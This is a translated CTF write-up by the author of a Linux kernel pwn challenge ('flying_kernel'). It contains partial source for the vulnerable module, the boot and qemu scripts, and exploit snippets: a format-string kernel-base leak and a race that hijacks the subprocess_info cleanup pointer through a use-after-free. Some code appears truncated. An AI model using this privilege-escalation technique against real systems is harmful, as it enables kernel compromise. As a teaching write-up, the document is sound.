# SCTF flying_kernel 出题总结
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
SCTF中一道linux kernel pwn的出题思路及利用方法，附赛后复盘
## 赛时情况
题目在早上九点第一波放出，在晚上6点由AAA战队取得一血，直到比赛结束一共有7支战队做出此题，作为一个kernel初学者很庆幸没被打烂orz（虽然被各种非预期打爆了，还是需要继续努力
## 出题思路
考点主要来源于CVE-2016-6187 的一篇利用文章，原文链接
简单概括就是使用以下语句
    socket(22, AF_INET, 0);
会触发 `struct subprocess_info` 这个对象的分配，此结构为0x60大小，定义如下：
    struct subprocess_info {
        struct work_struct work;
        struct completion *complete;
        const char *path;
        char **argv;
        char **envp;
        struct file *file;
        int wait;
        int retval;
        pid_t pid;
        int (*init)(struct subprocess_info *info, struct cred *new);
        void (*cleanup)(struct subprocess_info *info);
        void *data;
    } __randomize_layout;
此对象在分配时最终会调用cleanup函数，如果我们能在分配过程中把cleanup指针劫持为我们的gadget，就能控制RIP，劫持的方法显而易见，即条件竞争
## 题目源码
先给出这次题目的模块源码
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    static char *sctf_buf = NULL;
    static struct class *devClass;
    static struct cdev cdev;
    static dev_t seven_dev_no;
    static ssize_t seven_write(struct file *filp, const char __user *buf, u_int64_t len, loff_t *f_pos);
    static long seven_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
    static int seven_open(struct inode *i, struct file *f);
    static int seven_close(struct inode *i, struct file *f);
    static struct file_operations seven_fops =
            {
                    .owner = THIS_MODULE,
                    .open = seven_open,
                    .release = seven_close,
                    .write = seven_write,
                    .unlocked_ioctl = seven_ioctl
            };
    static int __init seven_init(void)
    {
        if (alloc_chrdev_region(&seven_dev_no, 0, 1, "seven") /dev/console
    exec 2>/dev/console
    echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
    insmod /flying.ko
    chmod 666 /dev/seven
    chmod 700 /flag
    echo 1 > /proc/sys/kernel/kptr_restrict
    echo 1 > /proc/sys/kernel/dmesg_restrict
    chmod 400 /proc/kallsyms
    poweroff -d 120 -f &
    setsid /bin/cttyhack setuidgid 1000 /bin/sh
    umount /proc
    umount /sys
    umount /tmp
    poweroff -d 0  -f
主要设置tmp目录用来上传文件
`echo 1 > /proc/sys/kernel/kptr_restrict  
echo 1 > /proc/sys/kernel/dmesg_restrict  
chmod 400 /proc/kallsyms`
这里也限制泄露内核基址
###  qemu
qemu的启动脚本如下：
    #!/bin/sh
    qemu-system-x86_64 \
        -m 128M \
        -kernel /home/ctf/bzImage \
        -initrd /home/ctf/rootfs.img \
        -monitor /dev/null \
        -append "root=/dev/ram console=ttyS0 oops=panic panic=1 nosmap" \
        -cpu kvm64,+smep \
        -smp cores=2,threads=2 \
        -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
        -nographic
多核，且开了smep保护，关掉了smap保护，且内核默认有kpti和kaslr保护，所以相当于开启了kpti和kaslr
## 利用
因为漏洞点很明显，主要讲讲怎么利用漏洞。
首先是泄露的问题，由于存在一个格式化字符串漏洞，所以可以直接利用它来leak kernel_base
具体代码如下：
        write(fd,"%llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx ",0x80);
        show(fd);
        scanf("%llx",&magic1);
注意这里不能使用%p，否则内核会检测到信息泄漏，得不到正确的结果。
然后接下来就是0x80的UAF利用，由于开启了freelist随机化和Harden_freelist保护，理论上来说，因为题目条件的限制，想直接劫持next指针实现任意地址写几乎是不可能的，所以这里不是考察的点，但这里存在了非预期，后文复盘会提到。
注意到0x80的分配用的是 `kmalloc-128`，而 `struct subprocess_info`
此对象的分配也是使用的`kmalloc-128`，由于题目存在UAF，所以当此对象落在我们能控制的chunk上时，就可以通过条件竞争劫持cleanup的指针，主要流程为：一个线程不断的调用`socket(22,
AF_INET, 0)` 另一个线程则循环往chunk写数据，覆盖cleanup指针为我们的gadget。
    pthread_t th;
    pthread_create(&th, NULL, race, (void*)buf);
    while(1) {
            usleep(1);
            socket(22, AF_INET, 0);
    //        getshell();
            if (race_flag) break;
     }
     void *race(void *arg) {
      unsigned long *info = (unsigned long*)arg;
      info[0] = (u_int64_t)xchg_eax_esp; // cleanup
      while(1) {
        write(fd, (void*)info,0x20);
        if (race_flag) break;
      }
     }
这里很重要的一点是我们的覆盖要确保只覆盖cleanup指针，也就是写0x20字节，从0x60往后写，如果覆盖多了数据，会在ROP返回到用户态后死在使用fs或者syscall的地方，原因似乎有多种，有些玄学，很多师傅都卡在这里，在此磕头了orz，但我在write函数定义了可以从后面开始写的行为其实也带有提示的意味，不然会有点多余。